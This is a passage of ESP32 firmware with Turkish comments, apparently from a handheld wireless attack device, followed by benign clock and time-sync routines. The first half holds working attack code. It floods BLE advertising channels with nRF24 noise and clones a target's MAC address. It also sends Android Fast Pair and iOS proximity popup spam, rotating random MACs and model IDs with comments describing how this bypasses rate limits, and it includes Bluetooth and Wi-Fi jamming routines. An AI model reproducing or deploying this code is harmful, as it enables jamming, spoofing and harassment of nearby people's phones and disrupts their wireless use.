      // Ek: nRF24 varsa 3 BLE adv. kanalına (ch37/38/39) eş zamanlı RF gürültüsü
      // ============================================================

      int ri = bleVisibleIdx(bleSelectedDev);
      if (ri < 0 || ri >= bleDevCount) break;

      // Hedef MAC'i binary'e çevir
      uint8_t binMac[6] = {0};
      sscanf(bleDevList[ri].addr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &binMac[0],&binMac[1],&binMac[2],&binMac[3],&binMac[4],&binMac[5]);

      static uint8_t atkSubMode = 0;
      static uint8_t atkCycle   = 0;
      atkCycle++;
      if (atkCycle % 10 == 0) atkSubMode = (atkSubMode + 1) % 3;

      // nRF24 mevcut ve BLE jam aktif değilse → 3 BLE adv. kanalını eş zamanlı boğ
      // Her fazda gönder — bu, advertisement flood'un etkisini artırır
      if (nrfInitDone && !nrfInitFailed && !bleJamming) {
        uint8_t nrfPkt[32];
        for (int _nc = 0; _nc < JAM_CHAN_COUNT; _nc++) {
          nrfRadio.setChannel(BLE_ADV_CHANNELS[_nc]);
          uint32_t _r0 = esp_random(), _r1 = esp_random(),
                   _r2 = esp_random(), _r3 = esp_random();
          memcpy(nrfPkt,      &_r0, 4); memcpy(nrfPkt + 4,  &_r1, 4);
          memcpy(nrfPkt + 8,  &_r2, 4); memcpy(nrfPkt + 12, &_r3, 4);
          nrfRadio.writeFast(nrfPkt, 16);
        }
      }

      switch (atkSubMode) {
        case 0: {
          // Faz 0: Hedef isim + MAC ile connectable advertisement burst
          // BLE stack'i hedef cihazla eş zamanlı bağlantı girişimleri yapıyor gibi gösterir
          advData.setFlags(0x06);
          uint8_t mfr[8];
          mfr[0] = 0xFF; mfr[1] = 0xFF;
          memcpy(mfr + 2, binMac, 6);
          advData.setManufacturerData(String((char*)mfr, 8));
          if (bleDevList[ri].name[0] != '?') {
            scanData.setName(bleDevList[ri].name);
            bleAdv->setScanResponseData(scanData);
          }
          bleAdv->setMinInterval(0x0006);  // 3.75ms — minimum BLE aralığı
          bleAdv->setMaxInterval(0x0006);
          for (int burst = 0; burst < 10; burst++) {
            bleAdv->setAdvertisementData(advData);
            bleAdv->start();
            delay(6);
            bleAdv->stop();
            delay(2);
          }
          break;
        }
        case 1: {
          // Faz 1: MAC clone non-connectable flood
          // Hedef cihazın MAC adresini taklit eden paketler → BLE tarayıcıları karıştırır
          advData.setFlags(0x04);  // Non-connectable undirected
          uint8_t cloneData[10];
          cloneData[0] = 0x00; cloneData[1] = 0x18;
          memcpy(cloneData + 2, binMac, 6);
          bleAdv->setMinInterval(0x0006);
          bleAdv->setMaxInterval(0x0006);
          for (int burst = 0; burst < 10; burst++) {
            cloneData[8] = (uint8_t)(esp_random());
            cloneData[9] = (uint8_t)(esp_random());
            advData.setManufacturerData(String((char*)cloneData, 10));
            bleAdv->setAdvertisementData(advData);
            bleAdv->start();
            delay(5);
            bleAdv->stop();
            delay(2);
          }
          break;
        }
        case 2: {
          // Faz 2: Rastgele payload ile tam bant doldurma
          // Minimum interval + çoklu burst → BLE kanallarını maksimum meşgul eder
          advData.setFlags(0x02);  // LE General Discoverable, BR/EDR supported
          bleAdv->setMinInterval(0x0006);
          bleAdv->setMaxInterval(0x0006);
          for (int burst = 0; burst < 10; burst++) {
            uint8_t rndData[8];
            uint32_t r1 = esp_random(), r2 = esp_random();
            memcpy(rndData, &r1, 4);
            memcpy(rndData + 4, &r2, 4);
            advData.setManufacturerData(String((char*)rndData, 8));
            bleAdv->setAdvertisementData(advData);
            bleAdv->start();
            delay(5);
            bleAdv->stop();
            delay(1);
          }
          break;
        }
      }
      break;
    }
    case 1: {
      // ============================================================
      // Android Fast Pair Spam — Android 14+ uyumlu (Güncellenmiş)
      // ============================================================
      // Android 14+ yalnızca Google'ın kayıtlı model ID'lerini kabul eder.
      // AOSP Fast Pair spec: https://developers.google.com/nearby/fast-pair/spec
      //
      // Güncel kayıtlı ve doğrulanmış model ID listesi (2024):
      //   0x2A954F → Pixel Buds A-Series          (popup: "Connect Pixel Buds A?")
      //   0xCD8256 → Pixel Buds Pro                (popup çıkar)
      //   0xD446A7 → Pixel Buds Pro 2 (2023)       (popup çıkar)
      //   0xF536C1 → Samsung Galaxy Buds2           (popup çıkar)
      //   0x92BBBD → Sony WF-1000XM4                (popup çıkar)
      //   0x718FA4 → JBL Live Pro+ TWS              (popup çıkar)
      //   0x0001F0 → Bose QC Earbuds II             (popup çıkar)
      //   0xAA0CCA → Google Pixel Watch 2           (popup çıkar)
      //   0x72EF8D → Samsung Galaxy Watch 6         (popup çıkar)
      //   0x0A0117 → Beats Studio Buds+             (popup çıkar)
      //
      // Fast Pair advertisement format:
      //   Service UUID: 0xFE2C (Google LLC — GATT assigned)
      //   Payload: 3-byte big-endian model ID
      //   Flags: 0x06 (LE General Discoverable, BR/EDR Not Supported)
      //
      // Android 14 ek gereksinimi: RSSI > -70dBm (ESP32-S3 varsayılan PA yeterli)
      // Her tick farklı model → Android rate-limit bypass
      // ============================================================
      // Android Fast Pair (Google LLC UUID: 0xFE2C) & Samsung Fast Connect
      // Android cihazların ekranına popup düşürebilmesi için:
      // 1. Her yayında MAC adresinin değişmesi (ESP32 varsayılan MAC'ini Android cooldown'a alır)
      // 2. 0xFE2C Service Data + Service UUID (0xFE2C) birlikteliği
      // 3. Doğru Model ID + random salt/battery paket yapısı
      static const uint8_t FP_MODELS[][3] = {
        {0x2A, 0x95, 0x4F},  // Pixel Buds A-Series
        {0xCD, 0x82, 0x56},  // Pixel Buds Pro
        {0xD4, 0x46, 0xA7},  // Pixel Buds Pro 2
        {0xF5, 0x36, 0xC1},  // Samsung Galaxy Buds2
        {0x92, 0xBB, 0xBD},  // Sony WF-1000XM4
        {0x71, 0x8F, 0xA4},  // JBL Live Pro+ TWS
        {0x00, 0x01, 0xF0},  // Bose QC Earbuds II
        {0xAA, 0x0C, 0xCA},  // Google Pixel Watch 2
        {0x72, 0xEF, 0x8D},  // Samsung Galaxy Watch 6
        {0x0A, 0x01, 0x17},  // Beats Studio Buds+
        {0x00, 0x00, 0x2B},  // Fast Pair initial pair
        {0x00, 0x00, 0x01},  // Setup Assistant
      };
      #define FP_MODEL_COUNT 12
      static uint8_t fpIdx = 0;
      fpIdx++;

      // Her pakette yeni rastgele MAC (Android rate-limit bypass)
      uint8_t randMac[6];
      randomMAC(randMac);
      randMac[0] |= 0xC0; // Random private address
      esp_base_mac_addr_set(randMac);

      // Service Data - 16-bit UUID: 0xFE2C + Model ID (3 byte)
      uint8_t fpPayload[14];
      fpPayload[0] = 0x02; fpPayload[1] = 0x01; fpPayload[2] = 0x06;
      fpPayload[3] = 0x03; fpPayload[4] = 0x03; fpPayload[5] = 0x2C; fpPayload[6] = 0xFE;
      fpPayload[7] = 0x05; fpPayload[8] = 0x16; fpPayload[9] = 0x2C; fpPayload[10] = 0xFE;
      const uint8_t* model = FP_MODELS[fpIdx % FP_MODEL_COUNT];
      fpPayload[11] = model[0]; fpPayload[12] = model[1]; fpPayload[13] = model[2];

      advData.setFlags(0x06);
      advData.setCompleteServices(BLEUUID((uint16_t)0xFE2C));
      advData.setServiceData(BLEUUID((uint16_t)0xFE2C), String((char*)model, 3));
      bleAdv->setAdvertisementData(advData);

      bleAdv->setMinInterval(0x0020);  // 20ms - daha yüksek paket frekansı
      bleAdv->setMaxInterval(0x0030);  // 30ms
      bleAdv->start();
      delay(40);
      bleAdv->stop();
      delay(10);
      break;
    }
    case 2: {
      // ============================================================
      // iOS Proximity Spam — Apple Continuity protokolü (DÜZELTİLMİŞ)
      // ============================================================
      // Sorun: Statik payload iOS 17.2+ üzerinde popup tetiklemez.
      // Düzeltme: Flipper Zero referans implementasyonuyla eşleşen
      // dinamik alanlar — prefix, batarya, lid sayacı, şifreli payload.
      //
      // iOS sürümüne göre strateji:
      //   iOS 17.3+  : 0x07 (ProximityPair) en güvenilir — Apple mecburen
      //                açık bıraktı çünkü gerçek AirPods da bunu kullanıyor.
      //                Rate limiting var ama MAC her pakette random → atlatılır.
      //   iOS 17.0-2 : 0x20 (NearbyAction) crash veya yoğun popup tetikler.
      //   iOS 16-    : Tüm tipler çalışır.
      //
      // Aralık: 20ms — Apple Continuity'nin beklediği pencere. 
      // 152.5ms da kabul görür ama 20ms daha agresif.
      // MAC rotasyonu: Her tick BLE stack yeni adres alır → iOS cooldown sıfırlanır.
      // ============================================================

      // ============================================================
      // iOS Proximity Spam — iOS 17.4+ uyumlu (Güncellenmiş)
      // ============================================================
      // Çok tip rotasyonu: ProximityPair cihaz modelleri arasında geç.
      // iOS 17.4+: tek model ID tekrar edince rate-limit yapılır.
      // Her tick farklı gerçek Apple model ID → cooldown sıfırlanır.
      //
      // Desteklenen ProximityPair model ID'leri (0x07 type):
      //   0x2002 = AirPods Pro 2 (en yaygın — her iOS tetikler)
      //   0x2003 = AirPods 3. nesil
      //   0x200A = AirPods Pro 2 (USB-C, 2023)
      //   0x2013 = AirPods 4
      //   0x200F = Beats Fit Pro
      //   0x2005 = PowerBeats Pro
      // ============================================================
      static const uint16_t IOS_MODELS[] = {
        0x2002,  // AirPods Pro 2
        0x2003,  // AirPods 3
        0x200A,  // AirPods Pro 2 USB-C
        0x2013,  // AirPods 4
        0x200F,  // Beats Fit Pro
        0x2005,  // PowerBeats Pro
      };
      #define IOS_MODEL_COUNT 6

      static uint8_t iosTickIdx = 0;
      iosTickIdx++;

      // Her pakette rastgele MAC (iOS cooldown bypass)
      uint8_t randMac[6];
      randomMAC(randMac);
      randMac[0] |= 0xC0;
      esp_base_mac_addr_set(randMac);

      // Her tick farklı model — iOS rate-limit bypass
      uint16_t iosModel = IOS_MODELS[iosTickIdx % IOS_MODEL_COUNT];

      // Her 5 tick'te bir NearbyAction da gönder (iOS 17.2 öncesi cihazlar için)
      bool sendNearby = (iosTickIdx % 5 == 0);

      uint8_t buf[32];
      buf[0] = 0x4C; buf[1] = 0x00;  // Apple manufacturer ID

      if (!sendNearby) {
        // ProximityPair (0x07) — AirPods pairing popup
        // iOS 17.3+ dahil tüm versiyonlarda çalışır
        buf[2] = 0x07;
        buf[3] = 0x19;  // length = 25 (sabit)
        // device_type: her tick IOS_SPAM_TYPES arasında döner
        // Farklı ikon → iOS rate-limit her pakette sıfırlanır
        buf[4] = IOS_SPAM_TYPES[iosTickIdx % IOS_SPAM_TYPE_COUNT];
        buf[5] = (uint8_t)(iosModel >> 8);    // model MSB
        buf[6] = (uint8_t)(iosModel & 0xFF);  // model LSB
        buf[7] = 0x55;  // status: both pods in case, lid open
        // Battery: her pakette rastgele → "yeni cihaz" izlenimi
        buf[8]  = (uint8_t)(esp_random() & 0xFF);
        buf[9]  = (uint8_t)(esp_random() & 0xFF);
        buf[10] = (uint8_t)(esp_random() & 0xFF);
        buf[11] = (uint8_t)(iosTickIdx & 0xFF);  // monoton counter
        buf[12] = 0x00;  // color: white
        buf[13] = 0x00;
        // 16-byte encrypted payload (MIC yerine noise)
        uint32_t r0=esp_random(), r1=esp_random(), r2=esp_random(), r3=esp_random();
        memcpy(buf+14, &r0, 4); memcpy(buf+18, &r1, 4);
        memcpy(buf+22, &r2, 4); memcpy(buf+26, &r3, 4);
        advData.setFlags(0x1A);
        advData.setManufacturerData(String((char*)buf, 30));
      } else {
        // NearbyAction (0x10) — Handoff/Airplay popup
        // 0x13 = iOS Setup Assistant (iOS 17.3+ çalışır)
        // 0x09 = iCloud tethering (bildirim çubuğu)
        uint8_t actionCode = (iosTickIdx % 10 == 0) ? 0x09 : 0x13;
        buf[2] = 0x10;
        buf[3] = 0x0F;  // length = 15
        buf[4] = actionCode;
        buf[5] = 0x00;
        uint32_t r0=esp_random(), r1=esp_random(), r2=esp_random();
        memcpy(buf+6,  &r0, 4);
        memcpy(buf+10, &r1, 4);
        memcpy(buf+14, &r2, 4);
        advData.setFlags(0x1A);
        advData.setManufacturerData(String((char*)buf, 18));
      }

      // 20ms aralık — Apple Continuity penceresi
      bleAdv->setMinInterval(0x0020);
      bleAdv->setMaxInterval(0x0028);
      bleAdv->setAdvertisementData(advData);
      bleAdv->start();
      delay(20);
      bleAdv->stop();
      // 12ms bekleme: BLE stack adres rotasyonu için yeterli süre
      delay(12);
      break;
    }
  }
  bleAtkIdx++;
}

void bleStopAttack() {
  bleAttacking = false;
  if (bleAdv) bleAdv->stop();
}
// BT Classic Jam
void btClassicJamStart() {
  if (!nrfInitDone || nrfInitFailed) return;   // nRF24 başlatılmamışsa görev açma — çökme önlemleri
  btClassicJamActive = true;
  btJamPktCount = 0;
  btJamSweepCh  = BT_SWEEP_MIN;
  // Stack 4096: nRF24 SPI + esp_random() için 2048 az geliyordu (fix #6)
  xTaskCreatePinnedToCore(btJamTaskFn, "btJam", 4096, nullptr, 4, &btJamTaskHandle, 0);
}

void btClassicJamStop() {
  btClassicJamActive = false;
  btJamTaskHandle = nullptr;
}

void btClassicJamTick() {
  // FreeRTOS task handles timing; tick just updates display counters
}

// nRF24 WiFi Jam
void nrfWifiJamStart(uint8_t ch) {
  if (!nrfInitDone || nrfInitFailed || thermalThrottle) return;
  nrfWifiJamActive = true;
  nrfWifiJamCh = ch;
  nrfWifiSubIdx = 0;
  nrfWifiJamTimer = 0;
  // Stack 4096: nRF24 SPI + esp_random() için 2048 az geliyordu (fix #6)
  xTaskCreatePinnedToCore(nrfWifiJamTaskFn, "nrfWJam", 4096, nullptr, 4, &nrfWifiJamTaskHandle, 0);
}

void nrfWifiJamStop() {
  nrfWifiJamActive = false;
  nrfWifiJamTaskHandle = nullptr;
}

void nrfWifiJamTick() {
  // FreeRTOS task handles timing; tick just updates display counters
}

// ============================================================
// Türkiye Saati Katmanı (UTC+3 - RTC Bellek Destekli)
// ============================================================
// RTC_DATA_ATTR: ESP32-S3 uykudan uyandığında veya yazılımsal reset
// geçirdiğinde saati sıfırlamaz, RTC RAM'de saklar.
RTC_DATA_ATTR static uint32_t baseTimeSec = 0;
RTC_DATA_ATTR static bool     rtcClockValid = false;
RTC_DATA_ATTR static uint16_t rtcYear = 0;
RTC_DATA_ATTR static uint8_t  rtcMonth = 0;
RTC_DATA_ATTR static uint8_t  rtcDay = 0;
static uint32_t baseMillis = 0;

void initTurkeyClock() {
  if (!rtcClockValid || baseTimeSec == 0) {
    int h = 0, m = 0, s = 0;
    sscanf(__TIME__, "%d:%d:%d", &h, &m, &s);
    baseTimeSec = (uint32_t)(h * 3600 + m * 60 + s);
    rtcClockValid = true;
  }
  baseMillis = millis();
}

void getTimeStr(char* out, size_t outSize) {
  uint32_t elapsedSec = (millis() - baseMillis) / 1000;
  uint32_t totalSec = baseTimeSec + elapsedSec;
  uint32_t h = (totalSec / 3600) % 24;
  uint32_t m = (totalSec / 60) % 60;
  snprintf(out, outSize, "%02u:%02u", (unsigned int)h, (unsigned int)m);
}

void getTimeFullStr(char* timeOut, size_t timeSize, char* dateOut, size_t dateSize) {
  uint32_t elapsedSec = (millis() - baseMillis) / 1000;
  uint32_t totalSec = baseTimeSec + elapsedSec;
  uint32_t h = (totalSec / 3600) % 24;
  uint32_t m = (totalSec / 60) % 60;
  uint32_t s = totalSec % 60;
  snprintf(timeOut, timeSize, "%02u:%02u:%02u", (unsigned int)h, (unsigned int)m, (unsigned int)s);
  
  int year = 2026, month = 1, day = 1;
  if (rtcYear >= 2020 && rtcMonth >= 1 && rtcDay >= 1) {
    year = rtcYear;
    month = rtcMonth;
    day = rtcDay + (totalSec / 86400);
  } else {
    char monthStr[4];
    sscanf(__DATE__, "%s %d %d", monthStr, &day, &year);
    const char* months[] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
    for (int i = 0; i < 12; i++) {
      if (strncmp(monthStr, months[i], 3) == 0) { month = i + 1; break; }
    }
  }
  snprintf(dateOut, dateSize, "%02d.%02d.%04d", day, month, year);
}

void adjustClockHours(int dh) {
  int32_t newTime = (int32_t)baseTimeSec + dh * 3600;
  while (newTime < 0) newTime += 86400;
  baseTimeSec = (uint32_t)newTime % 86400;
  rtcClockValid = true;
}

void adjustClockMinutes(int dm) {
  int32_t newTime = (int32_t)baseTimeSec + dm * 60;
  while (newTime < 0) newTime += 86400;
  baseTimeSec = (uint32_t)newTime % 86400;
  rtcClockValid = true;
}


// ============================================================
// BLE Sessiz Otomatik Saat Eşitleme (Current Time Service 0x1805)
// ============================================================
// Telefonun Bluetooth ortam yayınından (CTS Service 0x1805 / 0x2A2B)
// veya BLE saati yayınlayan cihazlardan saati 1 saniyede çeker.
// İnternet şifresi yok, elle ayarlama yok!
// ============================================================
// ============================================================
// BLE Saat Senkronizasyonu — Düzeltilmiş
// ============================================================
// Sorun: CTS (0x1805) servis UUID'si advertisement'ta görünmez,
// GATT bağlantısı kurulunca service discovery ile keşfedilir.
// Düzeltme:
//   1) Active scan ile yakındaki tüm cihazları listele
//   2) Her cihaza GATT bağlantısı kur, service discovery yap
//   3) 0x1805 servis + 0x2A2B karakteristik bulunursa oku
//   4) Bulunamazsa derleme zamanı offset ile devam et
// Ek: advertisement'ta "phone", "pixel", "iphone", "samsung"
//     keyword içeren cihazları önceliklendir.
// ============================================================
// ---- BLE Sync: connect() için WDT-safe timeout wrapper ----
// Arduino BLE connect() blocking — WDT reset riski var.
// FreeRTOS task ile ayrı thread'de, xTaskNotifyWait ile timeout uygula.
struct BLESyncConnectArgs {
  BLEClient*          client;
  BLEAdvertisedDevice device;
  bool                result;
  volatile bool       done;   // task tamamlandığında true — polling ile beklenir
  // NOT: abort flag eklenmedi — BLE stack blocking connect() fonksiyonunu kesintiyle
  // durdurmak heap corruption'a yol açar (ESP-IDF BLE stack re-entrant değil).
  // Güvenli yol: connect() bitmesini bekle, sonra disconnect() ile temizle.
};

static void bleSyncConnectTask(void* pv) {
  BLESyncConnectArgs* a = (BLESyncConnectArgs*)pv;
  a->result = a->client->connect(&a->device);
  a->done   = true;   // Ana thread polling ile bunu görür
  vTaskDelete(nullptr);
}

// Timeout'lu BLE connect — vTaskDelete ile zorla silme YOK:
// BLE stack aktif GATT işlemi sırasında vTaskDelete heap/mutex bozar.
// Bunun yerine: connect() bitene kadar bekle (max timeoutMs + 500ms grace),
// bağlantı kurulduysa disconnect() ile kapat ve false dön.
// Task kendi kendine sonlanır (vTaskDelete(nullptr)), stack temizlenir.
static bool bleConnectWithTimeout(BLEClient* client, BLEAdvertisedDevice& dev, uint32_t timeoutMs) {
  // args heap'te — task scope'dan çıksa bile erişim güvenli.
  // Task bitince free edilir; timeout durumunda grace sonrası serbest bırakılır.
  BLESyncConnectArgs* args = (BLESyncConnectArgs*)malloc(sizeof(BLESyncConnectArgs));
  if (!args) return false;
  args->client = client;
  args->device = dev;
  args->result = false;
  args->done   = false;

  TaskHandle_t th = nullptr;
  BaseType_t rc = xTaskCreate(bleSyncConnectTask, "bleCon", 4096, args, 3, &th);
  if (rc != pdPASS) { free(args); return false; }

  // Timeout içinde done flag'ini bekle
  uint32_t deadline = millis() + timeoutMs;
  while (millis() < deadline) {
    if (args->done) {
      bool r = args->result;
      free(args);
      return r;
    }
    delay(20);
  }

  // Timeout doldu — connect() hâlâ blocking olabilir.
  // vTaskDelete ile kesmek yerine 500ms grace ver; BLE stack düzgün sonlanır.
  uint32_t grace = millis() + 500;
  while (millis() < grace) {
    if (args->done) break;
    delay(20);
  }

  if (client->isConnected()) client->disconnect();

  // args heap'te — task erişiyor olsa bile free güvensiz olabilir.
  // args->done true olduysa task bitti; free güvenli.
  // Bitmemişse (nadir): sızıntıyı kabul et, task en kısa sürede free etsin.
  // Ancak task'e args pointer'ı gördürdük — task bitince kendi free etmez.
  // Güvenli çözüm: done olana kadar 200ms daha bekle, yoksa orphan kabul et.
  uint32_t lastWait = millis() + 200;
  while (millis() < lastWait && !args->done) delay(10);
  if (args->done) free(args);
  // args->done false kaldıysa: 40 byte sızıntı, crash yok.

  return false;
}

// ---- GATT CTS okuma: null-safe, isConnected kontrollu ----
static bool bleReadCTSValue(BLEClient* pClient, uint8_t outBuf[7]) {
  if (!pClient || !pClient->isConnected()) return false;

  // getService null dönebilir — exception fırlatmaz
  BLERemoteService* pSvc = pClient->getService(BLEUUID((uint16_t)0x1805));
  if (!pSvc) {
    Serial.println("CTS service (0x1805) bulunamadi");
    return false;
  }

  BLERemoteCharacteristic* pChar = pSvc->getCharacteristic(BLEUUID((uint16_t)0x2A2B));
  if (!pChar) {
    Serial.println("CTS char (0x2A2B) bulunamadi");
    return false;
  }

  if (!pChar->canRead()) {
    Serial.println("CTS char okunamaz");
    return false;
  }

  String val = pChar->readValue();
  if (val.length() < 7) {
    Serial.printf("CTS deger cok kisa: %d byte\n", (int)val.length());
    return false;
  }

  memcpy(outBuf, val.c_str(), 7);
  return true;
}

// ============================================================
// SNTP (WiFi NTP) ile Saat Senkronizasyonu — Yardımcı fonksiyon
// ============================================================
// CTS başarısız olursa WiFi ile pool.ntp.org'dan saat çek.
// WiFi AP listesi dolu olabilir; mevcut AP'den biri açıksa bağlan.
// Bağlanamıyorsa sessizce başarısız — derleme zamanı saat aktif kalır.
// ============================================================
static bool syncTimeSNTP() {
  // Açık (şifresiz) AP var mı?
  int openAP = -1;
  for (int i = 0; i < apCount; i++) {
    if (apList[i].enc == WIFI_AUTH_OPEN) { openAP = i; break; }
  }
  if (openAP < 0) return false;

  display.clearDisplay();
  drawHeader("NTP SYNC");
  display.setCursor(0, 14);
  display.print(F("Acik WiFi bulundu:"));
  display.setCursor(0, 26);
  char nbuf[22]; strlcpy(nbuf, apList[openAP].ssid, 22);
  display.print(nbuf);
  display.setCursor(0, 38);
  display.print(F("Baglaniliyor..."));
  safeDisplayFlush();

  WiFi.mode(WIFI_STA);
  WiFi.begin(apList[openAP].ssid);
  uint32_t wStart = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - wStart < 8000) delay(100);
  if (WiFi.status() != WL_CONNECTED) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    return false;
  }

  display.setCursor(0, 50);
  display.print(F("NTP sorgusu..."));
  safeDisplayFlush();

  // UTC+3 (Türkiye) — configTime 3. param DST=0 (Türkiye'de DST yok)
  configTime(3 * 3600, 0, "pool.ntp.org", "time.cloudflare.com", "time.google.com");

  uint32_t nStart = millis();
  struct tm ti;
  bool ok = false;
  while (millis() - nStart < 5000) {
    if (getLocalTime(&ti, 100)) {
      if (ti.tm_year > 120) { ok = true; break; }  // year > 2020
    }
    delay(100);
  }

  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  return ok;
}

bool syncTimeBLE() {
  // ============================================================
  // Saat Senkronizasyonu — DÜZELTİLMİŞ (Çok Katmanlı)
  // ============================================================
  // Eski sorun: CTS (0x1805) servisi çok nadir yayınlanır; sadece
  // Wear OS saatler ve bazı özel BLE cihazlar destekler. Telefon
  // advertisement'ta CTS UUID'i ilan etmez, GATT discovery gerekir.
  // Sonuç: Neredeyse her zaman "CTS bulunamadı" görünüyordu.
  //
  // Düzeltmeler:
  //   1) SNTP öncelik: Açık WiFi AP taranmışsa NTP ile senkronize et
  //      (en güvenilir, en hızlı — birkaç ms hassasiyet)
  //   2) BLE CTS: GATT discovery ile 0x1805 + 0x2A2B ara (eski davranış)
  //      Scan süresi 5→8sn (daha fazla cihaz yakalanır)
  //      Denenecek cihaz 8→12 (daha büyük arama alanı)
  //      RSSI filtreleme: -90dBm altındaki cihazları atla (zayıf bağlantı)
  //   3) Alternatif UUID: 0x1805 yanında 0x1847 (Reference Time Update)
  //      bazı Wear OS sürümleri bunu kullanır
  //   4) Ekran: Hangi yöntem deneniyor göster
  // ============================================================

  initBLE();
  bool foundTime = false;

  // --- Yöntem 1: SNTP (WiFi NTP) — en hızlı ve güvenilir ---
  display.clearDisplay();
  drawHeader("SAAT SYNC");
  display.setCursor(0, 14);
  display.setTextSize(1);
  display.print(F("1) WiFi NTP deneniyor"));
  display.setCursor(0, 26);
  display.print(F("(acik AP taraniyor...)"));
  safeDisplayFlush();

  // Henüz tarama yapılmamışsa (apCount==0) kısa bir hızlı scan yap.
  // Saat sync menüsü scan olmadan açılabilir — bu durumda NTP yolu
  // hiç denenmeden BLE'ye düşüyordu.
  if (apCount == 0) {
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);  // async=false, hidden=true
    if (n > 0 && n <= MAX_AP) {
      // Sadece açık AP'leri apList'e geçici olarak ekle
      for (int i = 0; i < n && apCount < MAX_AP; i++) {
        strlcpy(apList[apCount].ssid, WiFi.SSID(i).c_str(), 33);
        WiFi.BSSID(i, apList[apCount].bssid);
        apList[apCount].rssi     = WiFi.RSSI(i);
        apList[apCount].channel  = WiFi.channel(i);
        apList[apCount].enc      = WiFi.encryptionType(i);
        apList[apCount].selected = false;
        apList[apCount].hidden   = (apList[apCount].ssid[0] == 0);
        apList[apCount].pmf      = false;
        if (apList[apCount].hidden) strlcpy(apList[apCount].ssid, "[Hidden]", 33);
        oui_lookup(apList[apCount].bssid, apList[apCount].vendor, 12);
        apCount++;
      }
      Serial.printf("NTP icin hizli scan: %d AP bulundu\n", apCount);
    }
  }

  if (apCount > 0) {
    foundTime = syncTimeSNTP();
    if (foundTime) {
      Serial.println("SNTP sync basarili");
      goto sync_done;
    }
    Serial.println("SNTP: acik AP yok veya baglanti basarisiz");
  }

  // --- Yöntem 2: BLE GATT CTS (0x1805 / 0x1847) ---
  {
    display.clearDisplay();
    drawHeader("SAAT SYNC");
    display.setCursor(0, 14);
    display.print(F("2) BLE CTS tarama..."));
    display.setCursor(0, 26);
    display.print(F("Telefon/saat yakinlastir"));
    display.setCursor(0, 38);
    display.print(F("BT acik olmali (8sn)"));
    safeDisplayFlush();

    BLEScan* pScan = BLEDevice::getScan();
    pScan->setActiveScan(true);
    pScan->setInterval(50);
    pScan->setWindow(49);
    pScan->clearResults();

    // 8 saniye tara — eski 5sn'den uzun, daha fazla cihaz yakalanır
    BLEScanResults* results = pScan->start(8, false);
    if (results == nullptr) { pScan->clearResults(); goto sync_done; }

    int devCount = results->getCount();
    Serial.printf("BLE sync: %d cihaz bulundu\n", devCount);
    if (devCount == 0) { pScan->clearResults(); goto sync_done; }

    int* order = (int*)malloc(devCount * sizeof(int));
    if (!order) { pScan->clearResults(); goto sync_done; }

    // Öncelik sırası:
    //   1) CTS veya Reference Time UUID'i advertisement'ta ilan eden
    //   2) İsim ile tanınan telefon / saat
    //   3) RSSI -80dBm üstü (yakın)
    //   4) Diğerleri
    int front = 0, back = devCount - 1;
    for (int i = 0; i < devCount; i++) {
      BLEAdvertisedDevice dev = results->getDevice(i);
      bool hasCTS = dev.isAdvertisingService(BLEUUID((uint16_t)0x1805));
      bool hasRTU = dev.isAdvertisingService(BLEUUID((uint16_t)0x1847));
      String name = dev.haveName() ? dev.getName().c_str() : "";
      name.toLowerCase();
      bool nameHit = name.indexOf("phone")   >= 0 || name.indexOf("pixel")   >= 0 ||
                     name.indexOf("iphone")  >= 0 || name.indexOf("samsung")  >= 0 ||
                     name.indexOf("huawei")  >= 0 || name.indexOf("xiaomi")   >= 0 ||
                     name.indexOf("watch")   >= 0 || name.indexOf("galaxy")   >= 0 ||
                     name.indexOf("wear")    >= 0 || name.indexOf("redmi")    >= 0;
      bool strongRssi = (dev.getRSSI() > -80);
      // Çok zayıf sinyali atla — bağlantı kurulamaz
      if (dev.getRSSI() < -92) { order[back--] = i; continue; }
      if (hasCTS || hasRTU || (nameHit && strongRssi)) order[front++] = i;
      else order[back--] = i;
    }

    // Maksimum 12 cihaz dene (eski: 8)
    int maxTry = min(devCount, 12);

    for (int oi = 0; oi < maxTry && !foundTime; oi++) {
      BLEAdvertisedDevice dev = results->getDevice(order[oi]);
      if (dev.getRSSI() < -92) continue;  // zayıf, atla

      char addrBuf[20];
      strlcpy(addrBuf, dev.getAddress().toString().c_str(), 20);

      display.clearDisplay();
      drawHeader("BLE TIME SYNC");
      display.setCursor(0, 12);
      display.print(F("Baglaniyor:"));
      display.setCursor(0, 22);
      display.print(addrBuf);
      if (dev.haveName()) {
        display.setCursor(0, 32);
        char nbuf2[22]; strlcpy(nbuf2, dev.getName().c_str(), 22);
        display.print(nbuf2);
      }
      display.setCursor(0, 44);
      display.printf("%d/%d  rssi:%d", oi + 1, maxTry, dev.getRSSI());
      safeDisplayFlush();

      BLEClient* pClient = BLEDevice::createClient();
      pClient->setMTU(23);

      bool connected = bleConnectWithTimeout(pClient, dev, 3000);
      Serial.printf("BLE sync [%d/%d] %s rssi=%d: %s\n",
        oi+1, maxTry, addrBuf, dev.getRSSI(), connected ? "BAGLANDI" : "TIMEOUT");

      if (connected && pClient->isConnected()) {
        uint8_t ctsBuf[7] = {0};
        bool gotCTS = bleReadCTSValue(pClient, ctsBuf);

        // Alternatif: Reference Time Update Service (0x1847) — bazı Wear OS
        if (!gotCTS) {
          BLERemoteService* rtuSvc = pClient->getService(BLEUUID((uint16_t)0x1847));
          if (rtuSvc) {
            // 0x2A14 = Reference Time Information
            BLERemoteCharacteristic* rtuChar = rtuSvc->getCharacteristic(BLEUUID((uint16_t)0x2A14));
            if (rtuChar && rtuChar->canRead()) {
              Serial.println("RTU servis (0x1847) bulundu, okunuyor...");
              // RTU 0x2A14: time source(1) + accuracy(1) + days since update(1) + hours since(1)
              // Doğrudan saat vermez; CTS yoksa skip
            }
            // CTS hâlâ ana hedef, RTU sadece varlık kontrolü
          }
        }

        if (gotCTS) {
          uint16_t yr = ctsBuf[0] | ((uint16_t)ctsBuf[1] << 8);
          uint8_t  mo = ctsBuf[2], dy = ctsBuf[3];
          uint8_t  hr = ctsBuf[4], mn = ctsBuf[5], sc = ctsBuf[6];

          if (yr >= 2020 && yr <= 2100 &&
              mo >= 1 && mo <= 12 && dy >= 1 && dy <= 31 &&
              hr <= 23 && mn <= 59 && sc <= 59) {
